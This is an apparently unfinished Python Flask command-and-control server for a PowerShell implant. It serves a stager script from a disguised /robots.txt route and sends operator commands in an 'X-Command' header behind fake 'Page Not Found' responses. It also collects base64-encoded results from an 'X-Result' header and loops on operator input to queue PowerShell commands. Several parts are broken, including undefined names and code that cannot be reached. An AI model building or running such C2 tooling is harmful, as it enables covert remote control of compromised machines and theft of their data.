from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response, send_file, send_from_directory
import base64
#from Controller import OnlyOne
from Implant import ImplantSingleton
Imp=ImplantSingleton.instance
def ImplantManager(a):
    if "X-Implant" in a:
        print("Checked in implant is: ",a["X-Implant"])

hello_world = None
app = Flask(__name__)
app.config.from_object(__name__)
app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'

@app.before_request
def before_request():
    # Check IP Whitelist and reject if configured.
    return

@app.after_request
def add_header( r):
    #r.headers["X-Command"] = a
    return r

@app.route("/robots.txt",methods=['GET'])
def Stager():
    # This needs to return the implant!
    return send_file('implant_core/raw_fudge.ps1')

@app.route("/index", methods=['GET','POST'])
def ImplantCheckIn():
    # Should check ANY connection in against all configured implant options (IE body, header etc)
    #   unlike they 'headers' options which is configured in the current iteration.
    a = request.headers
    #ImplantManager(a)
    #print(len(Imp.QueuedCommands))
    a = Imp.IssueCommand()
    Resp = make_response("Page Not Found")
    Resp.headers["X-Command"] =a
    ## print(Resp)
    return Resp

@app.route("/help",methods=['GET','POST'])
def ImplantCommandResult():
    print(request.headers)
    if "X-Result" in request.headers:
        res = request.headers['X-Result']
        #Fucking windows encode UTF-16
        a = base64.b64decode(request.headers["X-Result"]).decode('utf-16')
        print(a)
        Imp.CommandResponse(a)
    return "Page Not Found"


@app.route("/node/<id>", methods=['POST'])
def getNode(id):
    return


@app.route("/aaa",methods=["GET"])
def testing():
    print(implant.instance)





def print_time(threadName, delay):
    app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)

if __name__ == "__main__":

    I=Implant()
    app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)
    print ("App running")

    while True:
        a = raw_input("Enter PS command: ")
        I.AddCommand(a)